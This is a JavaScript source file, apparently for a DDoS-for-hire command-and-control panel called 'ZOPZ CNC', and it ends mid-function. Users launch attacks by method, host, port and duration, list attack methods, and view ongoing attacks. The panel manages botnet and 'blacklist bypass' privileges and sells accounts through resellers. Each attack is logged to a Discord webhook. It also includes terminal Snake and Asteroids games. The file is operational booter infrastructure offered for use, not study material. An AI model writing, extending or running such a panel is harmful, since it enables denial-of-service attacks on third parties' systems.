const path = require('path');
const fs = require('fs'); // Default fs module for readFileSync
const fsp = require('fs').promises; // Promise-based fs for async operations
const fetch = require('node-fetch'); // Polyfill for fetch in Node.js
const bcrypt = require('bcrypt');   // ✅


if (typeof __dirname === 'undefined') {
    global.__dirname = path.resolve();
}

try {
    eval(fs.readFileSync(path.join(__dirname, './utils/UserUtils.js'), 'utf8') || '');
    eval(fs.readFileSync(path.join(__dirname, './utils/consoleUtils.js'), 'utf8') || '');
    eval(fs.readFileSync(path.join(__dirname, './utils/CheckHost.js'), 'utf8') || '');
    eval(fs.readFileSync(path.join(__dirname, './utils/Base64.js'), 'utf8') || '');
    eval(fs.readFileSync(path.join(__dirname, './handlers/Firewallmanger.js'), 'utf8') || '');
} 
catch (error) {
    console.error('Error loading utility files:', error.message);
    process.exit(1);
}
// Logs and tool manager.
const attacklogs = path.join(__dirname, './logs/attack_sent.log');
const methodsconfig = path.join(__dirname, './configs/methods.json');
const toolsDir = path.join(__dirname, './tools');

((stream) => { stream?.write('\x1B[2J\x1B[H'); });
globalThis.logToFile = globalThis.logToFile || ((path, action, data) => console.log(`Log to ${path}: ${action}`, data));
globalThis.redrawInline = globalThis.redrawInline || ((stream, buffer, cursorIndex, promptLength, lastDrawnLengthRef) => {
    const currentLength = promptLength + buffer.length;
    stream?.write('\r' + ' '.repeat(lastDrawnLengthRef.value) + '\r');
    stream?.write(`[97m${' '.repeat(promptLength)}${buffer}[97m`);
    stream?.write('\x1B[' + (cursorIndex + promptLength) + 'C');
    lastDrawnLengthRef.value = currentLength;
});
globalThis.getExpiryDays = globalThis.getExpiryDays || ((expiry) => {
    const now = new Date('2025-07-11T17:06:00Z');
    const expDate = new Date(expiry);
    return expDate > now ? Math.ceil((expDate - now) / (1000 * 60 * 60 * 24)) : 0;
});
globalThis.resizeTerminal = globalThis.resizeTerminal || ((stream) => {});
globalThis.disconnectUserByUsername = globalThis.disconnectUserByUsername || ((sessions, username) => false);
globalThis.broadcastMessage = globalThis.broadcastMessage || ((username, sessions, message) => 0);
globalThis.getTime = globalThis.getTime || ((time) => new Date('2025-07-11T17:06:00Z').toISOString()); // Default to current time
globalThis.LogPaths = globalThis.LogPaths || { AttacksSent: '', AdminDisconnects: '', BroadcastMessage: '', CreatedUsers: '', UserEdits: '' };
globalThis.Firewallmanger = globalThis.Firewallmanger || class { update(tof) { return Promise.resolve(); } };
function startSnakeGame(stream) {
    const width = 20;
    const height = 10;
    let snake = [{ x: Math.floor(width / 2), y: height - 1 }];
    let food = { x: Math.floor(Math.random() * width), y: Math.floor(Math.random() * height) };
    let direction = { x: 1, y: 0 };
    let score = 0;
    let alive = true;

    // Disable cursor
    stream?.write('\x1B[?25l');

    // Update game state
    function update() {
        if (!alive) return;

        let head = { x: snake[0].x + direction.x, y: snake[0].y + direction.y };

        // Wrap around boundaries
        if (head.x < 0) head.x = width - 1;
        if (head.x >= width) head.x = 0;
        if (head.y < 0) head.y = height - 1;
        if (head.y >= height) head.y = 0;

        // Check self-collision
        for (let segment of snake) {
            if (head.x === segment.x && head.y === segment.y) {
                alive = false;
                stream?.write('\x1B[2J\x1B[0fGame Over! Final Score: ' + score + '\r\nPress any key to restart.\r\n');
                return;
            }
        }

        snake.unshift(head);

        // Eat food
        if (head.x === food.x && head.y === food.y) {
            score++;
            food = { x: Math.floor(Math.random() * width), y: Math.floor(Math.random() * height) };
        } else {
            snake.pop();
        }

        draw();
    }

    // Draw game screen
    function draw() {
        let screen = '';
        for (let y = 0; y < height; y++) {
            let line = '';
            for (let x = 0; x < width; x++) {
                let isSnake = snake.some(segment => segment.x === x && segment.y === y);
                if (isSnake) line += 'O'; // Snake body
                else if (x === food.x && y === food.y) line += '*'; // Food
                else line += '-'; // Empty space
            }
            screen += line + '\r\n';
        }
        stream?.write('\x1B[2J\x1B[0f' + screen + 'Score: ' + score + '\r\n');
    }

    // Handle player input
    stream.on('data', function handleInput(data) {
        const key = data.toString().trim().toLowerCase();
        if (key === 'w' && direction.y !== 1 && alive) { direction = { x: 0, y: -1 }; }
        else if (key === 's' && direction.y !== -1 && alive) { direction = { x: 0, y: 1 }; }
        else if (key === 'a' && direction.x !== 1 && alive) { direction = { x: -1, y: 0 }; }
        else if (key === 'd' && direction.x !== -1 && alive) { direction = { x: 1, y: 0 }; }
        else if (key === 'q') {
            stream.removeListener('data', handleInput);
            clearInterval(gameInterval);
            stream?.write('Exited Snake game.\r\n');
            stream?.write('\x1B[?25h'); // Restore cursor
        }
        else if (key !== '' && !alive) {
            snake = [{ x: Math.floor(width / 2), y: height - 1 }];
            food = { x: Math.floor(Math.random() * width), y: Math.floor(Math.random() * height) };
            direction = { x: 1, y: 0 };
            score = 0;
            alive = true;
            clearInterval(gameInterval);
            gameInterval = setInterval(update, 200);
        }
        stream?.write('\x1B[1D\x1B[K'); // Clear input
    });

    const gameInterval = setInterval(update, 200); // Update every 200ms
}
// -------------------------
// Snake Game (same as before)
function startAsteroidsGame(stream) {
    const width = 20;
    const height = 10;
    let playerPos = Math.floor(width / 2);
    let bullets = [];
    let rocks = [];
    let score = 0;
    let rockSpeed = 0.1; // slower asteroids
    const bulletSpeed = 3; // faster bullets

    // Disable cursor
    stream?.write('\x1B[?25l');

    // Spawn a new rock
    function spawnRock() {
        const rockX = Math.floor(Math.random() * width);
        rocks.push({ x: rockX, y: 0, alive: true });
    }

    // Update positions and handle collisions
    function update() {
        // Move rocks down
        rocks.forEach(r => r.y += rockSpeed);

        // Move bullets up
        bullets.forEach(b => b.y -= bulletSpeed);

        // Check if rocks reach low height (y >= 2) and blow up
        rocks.forEach((r, ri) => {
            if (r.alive && Math.floor(r.y) >= 2) {
                r.alive = false;
                score++;
            }
        });

        // Remove rocks that are destroyed or fell off-screen
        rocks = rocks.filter(r => r.alive || r.y < height);
        bullets = bullets.filter(b => b.y >= 0);

        // Check if rock hits player
        if (rocks.some(r => Math.floor(r.y) >= height - 1 && r.x === playerPos && r.alive)) {
            stream?.write('\x1B[2J\x1B[0fGame Over! Final Score: ' + score + '\r\nPress any key to restart.\r\n');
            clearInterval(gameInterval);
            clearInterval(spawnInterval);
            clearInterval(shootInterval);
            stream?.write('\x1B[?25h'); // Restore cursor
            return;
        }

        draw();
    }

    // Draw the game screen with barrier
    function draw() {
        let screen = '';
        for (let y = 0; y < height; y++) {
            let line = '';
            for (let x = 0; x < width; x++) {
                if (y === height - 1 && x === playerPos) line += '^'; // player
                else if (y === height - 2 && x >= 0 && x < width) line += '='; // barrier
                else if (bullets.some(b => b.x === x && Math.floor(b.y) === y)) line += '|'; // bullet
                else {
                    const rock = rocks.find(r => Math.floor(r.x) === x && Math.floor(r.y) === y);
                    if (rock && rock.alive) line += 'O';
                    else line += '-';
                }
            }
            screen += line + '\r\n';
        }

        stream?.write('\x1B[2J\x1B[0f' + screen + 'Score: ' + score + '\r\n');
    }

    // Handle player input silently
    stream.on('data', function handleInput(data) {
        const key = data.toString().trim().toLowerCase();
        if (key === 'a' && playerPos > 0) playerPos--;
        if (key === 'd' && playerPos < width - 1) playerPos++;
        if (key === 'q') {
            stream.removeListener('data', handleInput);
            clearInterval(gameInterval);
            clearInterval(spawnInterval);
            clearInterval(shootInterval);
            stream?.write('Exited Asteroids game.\r\n');
            stream?.write('\x1B[?25h'); // Restore cursor
        }
        // Prevent default echo of input
        stream?.write('\x1B[1D\x1B[K'); // Move cursor left and clear line
    });

    const gameInterval = setInterval(update, 100); // faster frame updates
    const spawnInterval = setInterval(spawnRock, 1200); // spawn rocks every 1.2 sec
    const shootInterval = setInterval(() => bullets.push({ x: playerPos, y: height - 3 }), 200); // auto shoot every 0.2 sec
}
async function loadTools(toolsDir) {
    const tools = {};

    try {
        const files = await fsp.readdir(toolsDir);
        const toolFiles = files.filter(file => file.endsWith('.js'));

        for (const file of toolFiles) {
            const toolName = path.basename(file, '.js').toLowerCase();
            const toolPath = path.join(toolsDir, file);

            try {
                const toolModule = require(toolPath);
                const toolFn = typeof toolModule === 'function' ? toolModule : null;

                if (toolFn) {
                    tools[toolName] = toolFn;
                } else {
                    console.warn(`[WARN] Tool '${toolName}' does not export a function.`);
                }
            } catch (error) {
                console.error(`[ERROR] Failed to load tool '${toolName}': ${error.message}`);
            }
        }
    } catch (error) {
        console.error(`[ERROR] Unable to read tools directory: ${error.message}`);
    }

    return tools;
}
async function listTools(tools, stream) {
    stream?.write('Available tools:\r\n');
    for (const toolName in tools) {
        if (Object.prototype.hasOwnProperty.call(tools, toolName)) {
            stream.write(`- ${toolName}\r\n`);
        }
    }
}
function formatMethodsTable(methodsData) {
    if (!methodsData || typeof methodsData !== 'object') {
        return 'No methods data available.\r\n';
    }
    const methodNames = Object.keys(methodsData);
    const rows = methodNames.map((name, index) => {
        const method = methodsData[name] || {};
        const vip = method.vip === undefined ? (method.VIP === undefined ? 'false' : method.VIP) : method.vip;
        const maxSlots = method.maxSlots === undefined ? (method['maxConcurrents'] === undefined ? '∞' : method['maxConcurrents']) : method.maxSlots;
        const apiOnly = method.apiOnly === undefined ? (method['apiOnly'] === undefined ? 'false' : method['apiOnly']) : method.apiOnly;
        const enabled = method.enabled === undefined ? 'false' : method.enabled;
        return { index: index + 1, name, vip: String(vip), maxSlots: String(maxSlots), apiOnly: String(apiOnly), enabled: String(enabled) };
    });

    const indexWidth = Math.max(...rows.map(r => String(r.index).length), 1);
    const nameWidth = Math.max(...rows.map(r => r.name.length), 'Method Name'.length);
    const vipWidth = Math.max(...rows.map(r => r.vip.length), 3);
    const maxSlotsWidth = Math.max(...rows.map(r => r.maxSlots.length), 9);
    const apiOnlyWidth = Math.max(...rows.map(r => r.apiOnly.length), 8);
    const enabledWidth = Math.max(...rows.map(r => r.enabled.length), 7);

    const header = padRight('#', indexWidth) + '  ' +
        padRight('Method Name', nameWidth) + '  ' +
        padRight('VIP', vipWidth) + '  ' +
        padRight('Max Slots', maxSlotsWidth) + '  ' +
        padRight('API Only', apiOnlyWidth) + '  ' +
        padRight('Enabled', enabledWidth);

    const separator = '-'.repeat(indexWidth) + '  ' +
        '-'.repeat(nameWidth) + '  ' +
        '-'.repeat(vipWidth) + '  ' +
        '-'.repeat(maxSlotsWidth) + '  ' +
        '-'.repeat(apiOnlyWidth) + '  ' +
        '-'.repeat(enabledWidth);

    const formattedRows = rows.map(r =>
        padRight(r.index, indexWidth) + '  ' +
        padRight(r.name, nameWidth) + '  ' +
        padRight(r.vip, vipWidth) + '  ' +
        padRight(r.maxSlots, maxSlotsWidth) + '  ' +
        padRight(r.apiOnly, apiOnlyWidth) + '  ' +
        padRight(r.enabled, enabledWidth));
    return [header, separator, ...formattedRows].join('\r\n');
}

function padRight(str, length) {
    str = String(str);
    return str.length >= length ? str : str + ' '.repeat(length - str.length);
}
//async function loadUserThemeName(username, db) {
 // const userDoc = await db.collection('users').findOne({ username });
 // return userDoc?.selectedTheme || 'default';
//}
//function loadThemeFile(themeName, fileName = 'home_page.tfx') {
//  const fullPath = path.join('./themes', themeName, fileName);
//  if (fs.existsSync(fullPath)) {
//    return fs.readFileSync(fullPath, 'utf8');
//  }
//  return ''; // fallback if not found
//}
async function HandleCommands(obj) {
    const { command, params = [], client, stream, pageContents = {}, user = {}, attackHandler = {}, db = {}, config = {}, activeSessions = new Map(), pauseRef = { value: false } } = obj || {};
    const tools = await loadTools(toolsDir).catch(err => {
        console.error('Failed to load tools:', err.message);
        return {};
    });

    if (!command) {
        stream?.write(`${pageContents?.consoleerror}\r\n`);
        return;
    }

    if (command === 'credits') {
    globalThis.clearScreen(stream);

stream?.write('\x1b[8;24;80t\x1b[97m┌──────────────────────────────────────────────────────────────────────────────┐\r\n');
stream?.write(`\x1b[97m│ \x1b[38;5;39mZOPZCNC \x1b[97m– Version: \x1b[38;5;39mFinal Version                                             \x1b[97m│\r\n`);
stream?.write('\x1b[97m│ A Compact, Powerful CNC built                                                │\r\n');
stream?.write('\x1b[97m│ Simple. Efficient. Effective.                                                │\r\n');
stream?.write('\x1b[97m│ Lead Developer: \x1b[38;5;39m@zopz.                                                       \x1b[97m│\r\n');
stream?.write('\x1b[97m│ Concept & Vision: \x1b[38;5;39m@zopz.                                                     \x1b[97m│\r\n');
stream?.write('\x1b[97m│ Info: \x1b[38;5;39mhttps://zopz-api.com/                                                  \x1b[97m│\r\n');
stream?.write('\x1b[97m│ Powered by: \x1b[38;5;39mZOPZ Services\x1b[97m (ZOPZ)                                             │\r\n');
stream?.write('\x1b[97m└──────────────────────────────────────────────────────────────────────────────┘\r\n');

} 

else if (pageContents[command]) {
    let temp = pageContents[command] || '';
    temp = (globalThis.replaceplan || ((t, u) => t))(temp, user);
    temp = (globalThis.sanitizeResellerLines || ((t, u) => t))(temp, user);
    temp = (globalThis.sanitizeAdminLines || ((t, u) => t))(temp, user);

    //Thread sleep
    await (globalThis.processWithSleep || ((text, stream) => stream.write(text)))(temp, stream);
}

else if (attackHandler.methods && attackHandler.methods[command]) {
    if (!config.attacks_enabled) {
        stream?.write('All attacks are currently disabled.\r\n');
        return;
    }
    const [host, port, time, len] = params;
    if (!host || !port || !time) {
        stream?.write('usage: <method> <host> <port> <time>\r\n');
        return;
    }
    try {
        const result = await attackHandler.processRequest(command, { host, port, time, len }, user)
            .catch(err => ({ error: err.message }));

        if (!result || result.error) {
            stream?.write(`${result?.error || 'Unknown error occurred'}\r\n`);
            if (!result) console.error(`processRequest returned undefined for command: ${command}`);
        } 
        else {
            let attacksent = (pageContents.attacksent || '')
        .replace(/{user.username}/g, user.username)
        .replace(/{user.password}/g, user.password)
        .replace(/{user.role}/g, user.role)
        .replace(/{user.admin}/g, user.admin)
        .replace(/{user.reseller}/g, user.reseller)
        .replace(/{user.vip}/g, user.vip)
        .replace(/{user.expiry}/g, user.expiry)
        .replace(/{user.maxTime}/g, user.maxTime)
        .replace(/{user.concurrents}/g, user.concurrents)
        .replace(/{user.cooldown}/g, user.cooldown)
        .replace(/{user.api}/g, user.api)
        .replace(/{user.spambypass}/g, user.spambypass)
        .replace(/{user.blacklistbypass}/g, user.blacklistbypass)
        .replace(/{user.homeholder}/g, user.homeholder)
        .replace(/{user.botnet}/g, user.botnet)
        .replace(/{user.banned}/g, user.banned)
                .replace(/{clear}/g, '\x1b[2J\x1b[H')
                .replace(/<<\$clear>>/g, '\x1b[2J\x1b[H')
                .replace(/{result.target.host}/g, result.target.host)
                .replace(/{result.target.port}/g, result.target.port)
                .replace(/{result.target.duration}/g, result.target.duration)
                .replace(/{result.target.time_sent}/g, new Date(result.target.time_sent).toLocaleString(undefined, {
    month: "numeric",
    day: "numeric",
    year: "numeric",
    hour: "numeric",
    minute: "2-digit",
    second: "2-digit",
    hour12: true
}))

                .replace(/{result.target.asn}/g, result.target.asn || 'N/A')
                .replace(/{result.target.org}/g, result.target.org || 'N/A')
                .replace(/{result.target.country_code}/g, result.target.country_code || 'N/A')
                .replace(/{command}/g, command);

stream?.write(attacksent);

if (config.attack_logs) {
    const logData = {
        user: user.username,
        target: result.target.host,
        port: result.target.port,
        time: result.target.duration,
        method: result.target.method,
        datetime: new Date(result.target.time_sent).toLocaleString(undefined, {
            month: "numeric",
            day: "numeric",
            year: "numeric",
            hour: "numeric",
            minute: "2-digit",
            second: "2-digit",
            hour12: true
        })
        
    };

    globalThis.logToFile(globalThis.LogPaths.AttacksSent, 'Sent attack', logData);


                if (config.webhook_enabled) {
                    const webhookPayload = {
                        embeds: [{
                            title: "ZOPZ CNC Logs",
                            color: 16711680,
                            fields: [
                                { name: "User", value: logData.user, inline: true },
                                { name: "Target", value: logData.target, inline: true },
                                { name: "Port", value: logData.port.toString(), inline: true },
                                { name: "Duration", value: logData.time.toString(), inline: true },
                                { name: "Method", value: logData.method, inline: true },
                                { name: "Time Sent", value: logData.datetime }
                            ],
                            footer: { text: "Attack Logs" },
                            timestamp: new Date().toISOString()
                        }]
                    };

                    const webhookUrl = config.webhook;

                    fetch(webhookUrl, {
                        method: "POST",
                        headers: { "Content-Type": "application/json" },
                        body: JSON.stringify(webhookPayload)
                    }).catch(err => {
                        console.error("Failed to send webhook:", err.message);
                    });
                }
            }
        }
    } 
    catch (err) {
        stream?.write(`Error processing attack: ${err.message}\r\n`);
    }
}
else if (command === 'attacks') {
    const configPath = path.join(__dirname, './configs/main.json');
  
    if (!user?.admin) {
        stream?.write('You must be an admin to run this command.\r\n');
        return;
    }

    if (params[0] === 'enable') {
        config.attacks_enabled = true;
        stream?.write('Attacks have been enabled.\r\n');
    } 
    else if (params[0] === 'disable') {
        config.attacks_enabled = false;
        stream?.write('Attacks have been disabled.\r\n');
    } 
    else if (params[0] === 'status') {
        stream?.write('Attacks are currently ' + (config.attacks_enabled ? 'enabled' : 'disabled') + '\r\n');
    } 
    else {
        stream?.write('Usage: attacks <enable | disable | status>\r\n');
    }

    try {
        const currentConfig = JSON.parse(await fsp.readFile(configPath, 'utf8'));

        currentConfig.attacks_enabled = config.attacks_enabled;

        await fsp.writeFile(configPath, JSON.stringify(currentConfig, null, 4));

        console.log(`Configuration saved to ${configPath}`);
    } catch (error) {
        console.error('Error updating configuration file:', error);
    }
}
else if (command === 'adduserid') {
    const configPath = path.join(__dirname, './configs/main.json');

    if (!user?.admin) {
        stream?.write('You must be an admin to run this command.\r\n');
        return;
    }
    if (!params[0] || isNaN(params[0])) {
        stream?.write('Usage: adduserid <user_id>\r\n');
        return;
    }

    const userId = parseInt(params[0]);

    try {
        const currentConfig = JSON.parse(await fsp.readFile(configPath, 'utf8'));

        if (currentConfig.whitelisted_userids.includes(userId)) {
            stream?.write('This user ID is already whitelisted.\r\n');
            return;
        }
        currentConfig.whitelisted_userids.push(userId);

        await fsp.writeFile(configPath, JSON.stringify(currentConfig, null, 4));

        stream?.write(`User ID ${userId} has been added to the whitelist.\r\n`);
        console.log(`User ID ${userId} added to the whitelist. Configuration saved to ${configPath}`);

    } catch (error) {
        console.error('Error updating configuration file:', error);
        stream?.write('An error occurred while updating the configuration.\r\n');
    }
}
else if (command === 'removeuserid') {
    const configPath = path.join(__dirname, './configs/main.json');

    if (!user?.admin) {
        stream?.write('You must be an admin to run this command.\r\n');
        return;
    }

    if (!params[0] || isNaN(params[0])) {
        stream?.write('Usage: removeuserid <user_id>\r\n');
        return;
    }

    const userId = parseInt(params[0]);

    try {

        const currentConfig = JSON.parse(await fsp.readFile(configPath, 'utf8'));

        if (!currentConfig.whitelisted_userids.includes(userId)) {
            stream?.write('This user ID is not whitelisted.\r\n');
            return;
        }

        const updatedWhitelist = currentConfig.whitelisted_userids.filter(id => id !== userId);
        currentConfig.whitelisted_userids = updatedWhitelist;

        await fsp.writeFile(configPath, JSON.stringify(currentConfig, null, 4));

        stream?.write(`User ID ${userId} has been removed from the whitelist.\r\n`);
        console.log(`User ID ${userId} removed from the whitelist. Configuration saved to ${configPath}`);

    } catch (error) {
        console.error('Error updating configuration file:', error);
        stream?.write('An error occurred while updating the configuration.\r\n');
    }
}

else if (command === 'tools') {
    const toolsDir = path.join(__dirname, 'tools');
    const tools = await loadTools(toolsDir);
    await listTools(tools, stream);
}

else if (command in tools) {
    const tool = tools[command];
    if (typeof tool === 'function') {
        try {
            await tool(params.slice(0), stream);
        } catch (err) {
            stream.write(`Error occurred when executing command: ${err.message}\r\n`);
        }
    } else {
        stream.write(`Tool '${command}' is not a function.\r\n`);
    }
}
else if (command === 'methodslist') {
    console.log('Looking for methods config at:', methodsconfig);
    let methodsData = {};
    try {
        const raw = await fsp.readFile(methodsconfig, 'utf8').catch(() => '{}');
        methodsData = JSON.parse(raw);
    } 
    catch (e) {
        stream?.write('Error loading methods config.\r\n');
        return;
    }
    const output = formatMethodsTable(methodsData);
    stream?.write(output + '\r\n');
} 
else if ((command === 'dc' || command === 'kick') && user?.admin) {
    const targetUser = params[0];
    if (!targetUser) {
        stream?.write(`[97mUsage: ${command} <username>[97m\r\n`);
        return;
    }
    const success = globalThis.disconnectUserByUsername(activeSessions, targetUser);
    if (success) {
        stream?.write(`[97mKicked user '${targetUser}'[97m\r\n`);
        globalThis.logToFile(globalThis.LogPaths.AdminDisconnects, 'Admin disconnected a user', {
            admin: user.username,
            target: targetUser
        });
    } else {
        stream?.write(`[97mNo active session found for '${targetUser}'[97m\r\n`);
        globalThis.logToFile(globalThis.LogPaths.AdminDisconnects, 'Failed to disconnect user (not found)', {
            admin: user.username,
            target: targetUser
        });
    }
} 
else if (command === 'broadcast' && user?.admin) {
    const message = params.join(' ').trim();
    if (!message) {
        stream?.write(`[97mMessage can't be empty[97m\r\n`);
        return;
    }
    const count = globalThis.broadcastMessage(user.username, activeSessions, message);
    stream?.write(`Broadcasted message to ${count} user(s)\r\n`);
    globalThis.logToFile(globalThis.LogPaths.BroadcastMessage, 'Admin broadcasted a message', {
        admin: user.username,
        recipients: count,
        message
    });
} 
else if (command === 'plan') {
    const rawText = pageContents['userplan'] || '';
    if (!rawText) {
        stream?.write('Error: plan template not found.\r\n');
        return;
    }
    const latestUser = await db.findDocumentByKey('username', user.username, config.mongo_db_collection).catch(() => null);
    if (!latestUser) {
        stream?.write('Error: user not found in database.\r\n');
        return;
    }
    globalThis.clearScreen(stream);
    let replacedText = (globalThis.replaceplan || ((t, u) => t))(rawText, latestUser);
    replacedText = (globalThis.replaceUsername || ((t) => t))(replacedText);
    replacedText = (globalThis.sanitizeAdminLines || ((t) => t))(replacedText);
    stream?.write(`${replacedText}\r\n`);
    }
    else if (['clear', 'home', 'cls'].includes(command)) {
    globalThis.clearScreen(stream);
    let temp = pageContents['home_page'] || '';
    temp = (globalThis.replaceUsername || ((t, u) => t))(temp, user);
    temp = (globalThis.replaceplan || ((t, u) => t))(temp, user);
    temp = (globalThis.sanitizeAdminLines || ((t, u) => t))(temp, user);
    stream?.write(temp);
    }
else if (command === 'passwd') {
    const newpass = params[0];
    if (!newpass) {
        stream?.write('usage: passwd <newpass>\r\n');
        return;
    }

    if (newpass.length < 6) {
        stream?.write('Error: password must be at least 6 characters\r\n');
        return;
    }

    try {
        const saltRounds = 10;
        const hashedPass = await bcrypt.hash(newpass, saltRounds);

        await db.updateDocumentByKey(
            'username',
            user.username,
            { password: hashedPass },
            config.mongo_db_collection
        );

        stream?.write(`\rUser Update Successful\r\n`);
        stream?.write(`┌─ Username: ${user.username}\r\n`);
        stream?.write(`└─ Updated: Password securely hashed\r\n`);
    } catch (err) {
        console.error(err);
        stream?.write('Error: could not update password\r\n');
    }
}

    else if (command === 'firewall' && user?.admin) {
        const tofRaw = params[0];
        if (!tofRaw || !['true', '1', 'yes', 'false', '0', 'no'].includes(tofRaw.toLowerCase())) {
            stream?.write(`[97mUsage: firewall <true|false>[97m\r\n`);
        } else {
            const tof = ['true', '1', 'yes'].includes(tofRaw.toLowerCase());
            const fw = new globalThis.Firewallmanger();
            try {
                await fw.update(tof).catch(err => { throw err; });
                stream?.write(`[97mFirewall rules ${tof ? 'added' : 'removed'} successfully.[97m\r\n`);
            } catch (err) {
                stream?.write(`[97mFirewall operation failed: ${err.message}[97m\r\n`);
            }
        }
    } 
    else if (command === 'admin' && user?.admin) {
        const adminText = pageContents.admin || '';
        if (adminText) {
            stream?.write(`${adminText}\r\n`);
        }
    } 
    else if (command === 'exit' || command === 'logout') {
        client?.end();
    } 
else if (command === 'themes') {
    const themes = fs.readdirSync('./themes').filter(f => {
        return fs.existsSync(path.join('./themes', f, 'home_page.tfx'));
    });

    let settings = await db.findDocumentByKey('key', 'site_settings', config.mongo_db_collection)
        .catch(() => null);

    if (!settings) {
        settings = { selectedTheme: 'default' };
    }

    stream.write('Available themes: ' + themes.join(', ') + '\n\r');
    stream.write('Current theme: ' + settings.selectedTheme + '\n\r');
    stream.write('Use "selecttheme <theme_name>" to change theme\n\r');
}


else if (command === 'ongoing') {
    const ongoingAttacks = attackHandler.activeAttacks?.values ? Array.from(attackHandler.activeAttacks.values()) : [];
    if (!ongoingAttacks.length) {
        stream?.write('No ongoing attacks\n\r');
        return;
    }
    const isAdmin = user?.admin;

    // Load config to determine type
    const configPath = path.join(__dirname, './configs/main.json');
    let config = {};
    try {
        config = JSON.parse(fs.readFileSync(configPath, 'utf-8'));
    } catch (err) {
        console.error('Failed to read config:', err);
    }

    // Prepare data rows
    const attacks = ongoingAttacks.map((r, i) => {
        const remainingSeconds = Math.max(0, Math.ceil(((r.startTime || 0) + (r.params?.time || 0) * 1000 - Date.now()) / 1000));
        let type = 'CNC';
        if (r.params?.port === config.api?.port) type = 'API';
        else if (r.params?.port === config.ssh?.port) type = 'CNC';

        return {
            index: i + 1,
            username: isAdmin ? (r.username || '') : '****',
            method: r.method || '',
            host: isAdmin ? (r.params?.host || '') : '****',
            port: r.params?.port || 0,
            time: r.params?.time || 0,
            remaining: remainingSeconds,
            type
        };
    });

    // Compute max column widths
    const colWidths = {
        index: Math.max(...attacks.map(a => a.index.toString().length), 1),
        username: Math.max(...attacks.map(a => a.username.length), 4),
        method: Math.max(...attacks.map(a => a.method.length), 6),
        host: Math.max(...attacks.map(a => a.host.length), 4),
        port: Math.max(...attacks.map(a => a.port.toString().length), 4),
        time: Math.max(...attacks.map(a => a.time.toString().length), 4),
        remaining: Math.max(...attacks.map(a => a.remaining.toString().length), 9),
        type: Math.max(...attacks.map(a => a.type.length), 4),
    };

    // Borders
    const topBorder = '╔' + [
        '═'.repeat(colWidths.index + 2),
        '═'.repeat(colWidths.username + 2),
        '═'.repeat(colWidths.method + 2),
        '═'.repeat(colWidths.host + 2),
        '═'.repeat(colWidths.port + 2),
        '═'.repeat(colWidths.time + 2),
        '═'.repeat(colWidths.remaining + 2),
        '═'.repeat(colWidths.type + 2)
    ].join('╦') + '╗\r\n';

    const midBorder = '╠' + [
        '═'.repeat(colWidths.index + 2),
        '═'.repeat(colWidths.username + 2),
        '═'.repeat(colWidths.method + 2),
        '═'.repeat(colWidths.host + 2),
        '═'.repeat(colWidths.port + 2),
        '═'.repeat(colWidths.time + 2),
        '═'.repeat(colWidths.remaining + 2),
        '═'.repeat(colWidths.type + 2)
    ].join('╬') + '╣\r\n';

    const bottomBorder = '╚' + [
        '═'.repeat(colWidths.index + 2),
        '═'.repeat(colWidths.username + 2),
        '═'.repeat(colWidths.method + 2),
        '═'.repeat(colWidths.host + 2),
        '═'.repeat(colWidths.port + 2),
        '═'.repeat(colWidths.time + 2),
        '═'.repeat(colWidths.remaining + 2),
        '═'.repeat(colWidths.type + 2)
    ].join('╩') + '╝\r\n';

    // Header row
    const headerRow = '║ ' +
        '#'.padEnd(colWidths.index) + ' ║ ' +
        'User'.padEnd(colWidths.username) + ' ║ ' +
        'Method'.padEnd(colWidths.method) + ' ║ ' +
        'Host'.padEnd(colWidths.host) + ' ║ ' +
        'Port'.padEnd(colWidths.port) + ' ║ ' +
        'Time'.padEnd(colWidths.time) + ' ║ ' +
        'Remaining'.padEnd(colWidths.remaining) + ' ║ ' +
        'Type'.padEnd(colWidths.type) + ' ║\r\n';

    // Rows
    const rows = attacks.map(a =>
        '\x1b[97m║ ' +
        a.index.toString().padEnd(colWidths.index) + ' ║ ' +
        a.username.padEnd(colWidths.username) + ' ║ ' +
        a.method.padEnd(colWidths.method) + ' ║ ' +
        a.host.padEnd(colWidths.host) + ' ║ ' +
        a.port.toString().padEnd(colWidths.port) + ' ║ ' +
        a.time.toString().padEnd(colWidths.time) + ' ║ ' +
        a.remaining.toString().padEnd(colWidths.remaining) + ' ║ ' +
        a.type.padEnd(colWidths.type) + ' ║\x1b[97m'
    ).join('\r\n');

    stream?.write('\x1b[0m\x1b[97m' + topBorder + headerRow + midBorder + rows + '\r\n' + bottomBorder + '\x1b[0m');
}
else if (command === 'clearlogs' && user?.admin) {
    globalThis.clearLogs?.();
    const logs_clear = pageContents.logs_clear || 'Logs cleared.\r\n';
    stream?.write(`${logs_clear}\r\n`);
    } 
    else if (command === 'reseller' && user?.reseller) {
        stream?.write('\x1B[2J\x1B[H');
        const rawText = pageContents['reseller_info'] || '';
        if (!rawText) {
            stream?.write('Error: template not found.\r\n');
            return;
        }
        const latestUser = await db.findDocumentByKey('username', user.username, config.mongo_db_collection).catch(() => null);
        if (!latestUser) {
            stream?.write('Error: user not found in database.\r\n');
            return;
        }
        let replacedText = rawText
            .replace(/{username}/g, user.username || '')
            .replace(/{reseller.usersSold}/g, user.usersSold || 0)
            .replace(/{reseller.earnings}/g, user.earnings || 0)
            .replace(/{reseller.owed}/g, user.owed || 0);
        stream?.write(`${replacedText}\r\n`);
    } 
else if (command === 'adduser' && (user?.admin || user?.reseller)) {
    if (pauseRef.value) return;
    if (pauseRef) pauseRef.value = true;

    const questions = [
        { key: 'username', text: 'Enter Username:' },
        { key: 'concurrents', text: 'Enter Concurrents:' },
        { key: 'maxTime', text: 'Enter MaxTime:' },
        { key: 'expiry', text: 'Enter Expiry (days or "Lifetime"):' },
        ...(user?.username === 'root' ? [
            { key: 'admin', text: 'Admin Access? (y/n):' },
            { key: 'reseller', text: 'Reseller Access? (y/n):' }
        ] : []),
        { key: 'botnet', text: 'Botnet Access? (y/n):' },
        { key: 'homeholder', text: 'Home Holder Access? (y/n):' },
        { key: 'api', text: 'API Access? (y/n):' },
        { key: 'vip', text: 'VIP Access? (y/n):' },
        { key: 'spambypass', text: 'Spam Bypass? (y/n):' },
        { key: 'blacklistbypass', text: 'Blacklist Bypass? (y/n):' },
        { key: 'cooldown', text: 'Cooldown (seconds):' },
        { key: 'role', text: 'Role (default=user):', optional: true }
    ];

    const getUserInputs = () => new Promise((resolve, reject) => {
        let index = 0;
        let inputs = {};
        let buffer = '';
        let cursorIndex = 0;
        const lastDrawnLengthRef = { value: 0 };
        let promptLength = 0;

        const askQuestion = () => {
            if (index >= questions.length) {
                stream?.removeListener('data', listener);
                stream?.write('\r\n');
                resolve(inputs);
                return;
            }
            const q = questions[index];
